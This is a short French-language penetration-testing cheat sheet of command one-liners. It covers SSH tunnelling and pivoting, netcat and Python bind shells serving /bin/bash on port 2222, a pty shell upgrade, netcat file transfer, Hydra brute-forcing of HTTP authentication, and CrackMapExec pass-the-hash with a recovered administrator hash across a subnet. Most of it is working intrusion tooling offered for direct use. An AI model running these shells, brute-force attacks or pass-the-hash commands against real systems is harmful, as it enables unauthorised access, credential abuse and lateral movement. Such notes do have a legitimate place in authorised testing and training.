Accorder les permissions pour un user specifique

```
setfacl -m u:username:rwx myfolder
```
Tunnel ssh dynamique sur le port local 8080:

```
ssh -ND 8080 root@addressIP
```
Rebonds avec ssh:

```
ssh -J root@premier_rebond root@cible
```
Port forwarding avec ssh:

```
ssh -NL port_local:cible_distante:port_cible_distante root@rebond</br>
```
<h3>Obtenir un shell</h3>
Ouvrent un shell sur le port 2222 :

```
 nc -lkvp 2222 -e /bin/bash
 python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```
On se connecte avec nc -nv 2222 adress port
<h4>Pour avoir un shell pty :</h4>

```
python -c "import pty; pty.spawn('/bin/bash')"
```
<h4>Pour avoir tab completion tout joli :</h4>
Prendre un shell pty avec la commande plus haut

```
 CTRL-Z
 stty raw -echo
 fg
```

Envoi fichier avec netcat :

```
nc -l -p 1234 > out.file
nc -w 3 [destination] 1234 < out.file
```

##### Tools

#### Hydra:
http-auth bute force

```
hydra -L user.txt -P password.txt -t12 -f x.x.x.x http-get / -V
```

#### XfreeRDP:

```
xfreerdp /f +clipboard /kbd:0x0000040C /u:USERNAME@DOMAIN /p:PASSWORD /v:IP
```


#### CrackMapExec

Une fois le hash administrateur récupéré sur un poste:

```
cme smb -u Administrateur -H HASH 192.168.20.0/24 --local-auth
```
